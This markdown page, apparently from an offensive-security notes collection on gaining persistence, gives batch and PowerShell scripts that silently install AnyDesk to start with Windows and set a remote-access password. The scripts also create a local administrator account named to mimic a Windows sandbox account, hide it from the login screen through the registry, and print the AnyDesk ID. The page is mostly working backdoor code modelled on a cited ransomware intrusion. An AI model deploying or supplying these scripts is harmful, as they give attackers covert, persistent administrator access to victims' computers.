# Third-Party Programs

TODO: Provide more third-party programs to gain persistence.

## 01 - AnyDesk

### 1.1 - Automation

`$ cat deploy.bat`

---

```
mkdir %appdata%\appdata\local\AnyDesk
curl.exe -o %appdata%\appdata\local\temp\Anydesk.exe https://download.anydesk.com/AnyDesk.exe
%appdata%\appdata\local\temp\anydesk.exe --install %appdata%\appdata\local\AnyDesk --start-with-win --slient
del %appdata%\appdata\local\temp\anydesk.exe
echo <password> | %appdata%\appdata\local\AnyDesk\AnyDesk.exe --set-password
net user WDAGUtilltyAccount <password> /add
net localgroup Administrators WDAGUtilltyAccount /add
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v WDAGUtilltyAccount /t REG_DWORD /d 0 /f
for /f "delims=" %i in ('%appdata%\AppData\Local\AnyDesk\AnyDesk.exe --get-id') do echo %i
```

`$ cat deploy.ps1`

---

```powershell
function AnyDesk {
    $anydesk_folder = "C:\ProgramData\AnyDesk"
    mkdir $anydesk_folder
    $web = New-Object Net.WebClient
    $url = "https://download.anydesk.com/AnyDesk.exe"
    $file = "C:\ProgramData\AnyDesk.exe"
    $web.DownloadFile($url, $file)
    
    $username = "WDAGUtilltyAccount"
    $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
    $password_cmd = "<password>"

    # cmd.exe /c $file --install $anydesk_folder --start-with-win --silent

    # cmd.exe /c echo $password_cmd | $file --set-password

    # net user $username $password_cmd /add
    # net localgroup Administrators $username /add
    # reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v WDAGUtilltyAccount /t REG_DWORD /d 0 /f

    # cmd.exe /c $path --get-id

    Start-Process -FilePath $file -NoNewWindow -Credential $credential -ArgumentList("--install", $anydesk_folder, "--start-with-win", "--slient")
    cmd.exe /c echo $password_cmd | $file --set-password

    New-LocalUser -Name $username -Password $password
    Add-LocalGroupMember -Groups Administrators -Member $username
    Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -Name WDAGUtilltyAccount -Type DWord -Value 0

    Start-Process -FilePath $file -NoNewWindow -Credential $credential -ArgumentList("--get-id")
}

AnyDesk
```

---
## References

- [The DFIR Report: Malicious ISO File Leads to Domain Wide Ransomware](https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/)